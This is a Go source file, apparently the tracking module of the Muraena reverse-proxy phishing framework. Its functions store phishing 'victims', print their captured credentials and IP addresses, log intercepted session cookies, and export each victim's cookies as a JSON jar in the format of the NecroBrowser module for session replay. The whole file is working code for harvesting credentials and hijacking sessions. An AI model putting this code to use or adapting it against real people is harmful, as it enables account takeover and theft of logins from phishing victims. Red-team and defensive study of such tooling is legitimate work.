package tracking

import (
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/muraenateam/muraena/module/necrobrowser"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/log"
)

func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {

	if !t.IsValid() {
		return nil, fmt.Errorf(fmt.Sprintf("GetVictim invalid tracking value [%s]", tui.Bold(tui.Red(t.ID))))
	}

	v, err = db.GetVictim(t.ID)
	if err != nil {
		return nil, err
	}
	return v, nil
}

// ShowCredentials prints the credentials in the CLI
func (module *Tracker) ShowCredentials() {

	columns := []string{
		"ID",
		"Key",
		"Value",
		"Time",
	}

	var rows [][]string

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
		return
	}

	module.Debug("There are %d victims", len(victims))
	for _, vID := range victims {
		for _, c := range vID.Credentials {
			rows = append(rows, []string{tui.Bold(tui.Green(vID.ID)), c.Key, c.Value, c.Time})
		}
	}

	tui.Table(os.Stdout, columns, rows)
}

// ExportSession prints the list of victims
func (module *Tracker) ExportSession(id string) {

	const timeLayout = "2006-01-02 15:04:05 -0700 MST"

	victim, err := db.GetVictim(id)
	if err != nil {
		module.Debug("error fetching victim %d: %s", id, err)
	}

	// this extra loop and struct is needed since browsers expect the expiration time in unix time, so also different type
	var cookieJar []necrobrowser.SessionCookie

	for _, c := range victim.Cookies {
		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
		t, err := time.Parse(timeLayout, c.Expires)
		if err != nil {
			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
			continue
		}

		nc := necrobrowser.SessionCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Expires:  t.Unix(),
			Path:     c.Path,
			HTTPOnly: c.HTTPOnly,
			Secure:   c.Secure,
			Session:  t.Unix() < 1,
		}

		cookieJar = append(cookieJar, nc)
	}

	cookieJarJson, err := json.Marshal(cookieJar)
	if err != nil {
		module.Warning("Error marshalling the cookieJar: %s", err)
		return
	}

	log.Info("Victim %s CookieJar:\n\n%s", id, cookieJarJson)
}

// ShowVictims prints the list of victims
func (module *Tracker) ShowVictims() {

	columns := []string{
		"ID",
		"IP",
		"UA",
	}

	victims, err := db.GetAllVictims()
	if err != nil {
		return
	}

	var rows [][]string
	for _, v := range victims {
		rows = append(rows, []string{tui.Bold(v.ID), v.IP, v.UA})
	}

	tui.Table(os.Stdout, columns, rows)
}

// PushVictim stores a Victim in the database
func (module *Tracker) PushVictim(v *db.Victim) {
	if err := v.Store(); err != nil {
		module.Debug("error adding victim to redis: %s", err)
	}
}

// PushCookie stores a Cookie in the database. If the cookie exists, it will be overridden
func (module *Tracker) PushCookie(victim *db.Victim, cookie db.VictimCookie) {

	if cookie.Domain == module.Session.Config.Proxy.Phishing {
		return
	}

	err := cookie.Store(victim.ID)
	if err != nil {
		module.Debug("ERROR: failed to add cookie %s to victim %s", cookie.Name, victim.ID)
		return
	}

	module.Debug("[%s] New victim cookie: %s on %s with value %s",
		victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Domain), tui.Bold(cookie.Value))
}
